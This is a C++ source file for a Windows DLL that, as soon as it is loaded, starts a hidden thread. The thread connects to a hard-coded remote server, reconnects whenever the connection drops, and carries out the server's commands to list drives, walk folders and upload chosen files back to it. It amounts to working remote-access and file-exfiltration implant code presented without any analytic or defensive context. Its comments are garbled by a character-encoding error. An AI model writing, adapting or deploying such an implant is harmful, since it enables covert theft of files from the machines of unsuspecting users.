
#include "socket_util.h"
#include "fileop.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <list>

#include "MyMutex.h"
#include "SockSendFileManager.h"

#if 1
extern "C" BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	// ����dll����Ϣ
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// ����ÿ������ִֻ��һ�Σ����̼���dll
		// Return FALSE to fail DLL load.

		//�����Լ����߳����Լ�����
		_beginthread(DoEveryThingYouWant, 0, NULL);

		//FreeLibrary(GetModuleHandle("condll.dll"));
		break;

	case DLL_THREAD_ATTACH:break;
	case DLL_THREAD_DETACH:break;
	case DLL_PROCESS_DETACH:break;
	}
	return TRUE;  
}
#else
int main()
{
	DoEveryThingYouWant(NULL);
	system("pause");
	return 0;
}
#endif

void DoEveryThingYouWant(void*)
{
	CSktUtil::CSUInit();

	SockSendFileManager* psssm = new SockSendFileManager();


	SOCKET s;
	sockaddr_in sa = CSktUtil::CSUSucConnect(s, SEVER_IP, SEVER_PORT);
	psssm->Init(SEVER_IP, SEVER_FPORT);

	size_t	recvbufSize = BUFFSIZE;
	char* trecvBuf = (char*)MyMalloc(recvbufSize);
	char* recvBuf;

	size_t	sendbufSize = BUFFSIZE;
	char* tsendBuf = (char*)MyMalloc(sendbufSize);
	char* sendBuf;
	memset(tsendBuf, 0x00, sendbufSize * sizeof(char));

	_uint32 len = 0;
	std::list<CFileTransInfo*> sendlist;
	CFileTransInfo* ptfti;
	int cmd = 0;

	for (;;)
	{
		recvBuf = trecvBuf;
		sendBuf = tsendBuf;
		if (CSktUtil::CSURecv(s, recvBuf, 4) <= 0)
		{
			CSktUtil::CSUClose(s);
			//�������ӷ�����
			CSktUtil::CSUSucConnect(s, sa);
			continue;
		}

		len = ntohl(*(_uint32*)(recvBuf));

		if (len > 0 && len < MAX_PATH)
		{
			if (CSktUtil::CSURecv(s, recvBuf, len) <= 0)
			{
				CSktUtil::CSUClose(s);
				//��������
				CSktUtil::CSUSucConnect(s, sa);
				continue;
			}
			if (8 == (cmd = ntohl(*(_uint32*)(recvBuf))))
			{
				psssm->SetEnd();
				delete psssm;
				//�ͷ�sendlist

				break;	//�������˳�ָ��
			}
			recvBuf += 4;
			switch (cmd)
			{
			case 1://�ϴ��ļ�ϵͳ��Ϣ
			{
				memset(sendBuf, 0x00, sendbufSize * sizeof(char));
				DWORD dwLen = ::GetLogicalDriveStringsA(MAX_PATH, sendBuf + 8);
				*(_uint32*)sendBuf = htonl(dwLen+4);		//����
				*(_uint32*)(sendBuf + 4) = htonl(1);	//����
				CSktUtil::CSUSend(s, sendBuf, dwLen + 8);
			}
			break;
			case 2://�ϴ�ָ���ļ��е�����
			{
				int len = 0;
				memset(sendBuf, 0x00, sendbufSize * sizeof(char));
				*(int*)(sendBuf + 4) = htonl(2);
				TraverFolder(MyVisitFile, recvBuf, sendBuf + 8, 0);
				len = strlen(sendBuf + 8) + 4;
				*(int*)sendBuf = htonl(len);
				//MessageBox(NULL, sendBuf + 8, recvBuf,1);
				CSktUtil::CSUSend(s, sendBuf, len + 4);
			}
			break;
			case 3://�ϴ��ļ�
			{
				ptfti = new CFileTransInfo();
				//����·��
				_uint32 len = 4;
				_uint32 tlen = ntohl(*(int*)recvBuf);
				strncpy(ptfti->remote_file_path, recvBuf + len, tlen);
				ptfti->remote_file_path[tlen] = 0;
				len += tlen;

				//Զ��·��rmtpath
				tlen = ntohl(*(int*)(recvBuf + len));
				len += 4;
				strncpy(ptfti->file_path, recvBuf + len, tlen);
				ptfti->file_path[tlen] = 0;
				len += tlen;

				//�ļ���filenamelen
				tlen = ntohl(*(int*)(recvBuf + len));
				len += 4;
				strncpy(ptfti->file_name, recvBuf + len, tlen);
				ptfti->file_name[tlen] = 0;

				//sendlist.push_back(ptfti);
				psssm->ReqSendFile(ptfti);
			}
			break;
			default:
				break;
			}
		}
	}

	free(recvBuf);
	CSktUtil::CSUCleanup();
}

bool MyVisitFile(const char* lpPath, int kind, void* data)
{
	if (NULL != data)
	{
		char* buf = (char*)data;
		sprintf(buf + strlen(buf), "[%c]%s", (kind & FILE_ATTRIBUTE_DIRECTORY) ? 'D' : 'F', lpPath);
		return true;
	}
	return false;
}

void MySucConnect()
{

}